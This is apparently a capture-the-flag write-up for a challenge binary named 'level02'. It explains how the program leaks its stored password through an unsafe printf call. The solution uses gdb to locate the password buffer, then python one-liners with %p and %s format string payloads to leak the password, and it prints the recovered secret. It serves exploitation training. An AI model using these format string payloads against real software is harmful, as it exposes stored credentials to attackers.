Program behavior:
1. Opens a password file with `fopen` function;
2. Reads a password to a buffer (real_pass);
3. Reads from stdin to a buffer (username) using `fgets` function;
4. Reads from stdin to a buffer (in_pass) using `fgets` function;
5. Opens a shell if the in_pass and real_pass are equal;
6. Otherwise calls vulnerable `printf` function.

Solution:
Use format string attack to print the password to stdout.

# Launch the debugger
gdb level02
# Inspect main function
disassemble main
`0x0000000000400a51 <+573>:   lea    -0xa0(%rbp),%rax`
# Run the debugged program
start
# Get address of buffer with real password
print/a $rbp-0xa0
`$1 = 0x7fffffffe540`
# Quit the debugger
quit
# Get the buffer offset
(python -c 'print "%8$p\n" + "BBBB"') | ./level02
`0x42424242 does not have access!`
# Initiate format string attack
(python -c 'print "%8$s\n" + "\x40\xe5\xff\xff\xff\x7f"') | ~/level02
`Hh74RPnuQ9sa5JAEXgNWCqz7sXGnh5J5M9KfPg3H does not have access!`
